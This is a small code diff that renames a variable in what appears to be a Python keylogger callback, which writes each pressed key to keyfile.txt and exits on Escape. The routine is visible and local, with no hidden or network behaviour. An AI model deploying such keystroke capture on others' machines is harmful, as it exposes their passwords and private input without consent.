@@ -11,12 +11,12 @@ def key_pressed(key):
         char = key.char
         if char is not None: 
             print(char, end='', flush=True)  
-            with open("keyfile.txt", 'a') as logKey:
-                logKey.write(char)
+            with open("keyfile.txt", 'a') as log_key:
+                log_key.write(char)
     except AttributeError:
         print(f"[{key}]", end='', flush=True)  
-        with open("keyfile.txt", 'a') as logKey:
-            logKey.write(f"[{key}]")
+        with open("keyfile.txt", 'a') as log_key:
+            log_key.write(f"[{key}]")
         if key == keyboard.Key.esc:
             print("Escape pressed, exiting...")
             return False
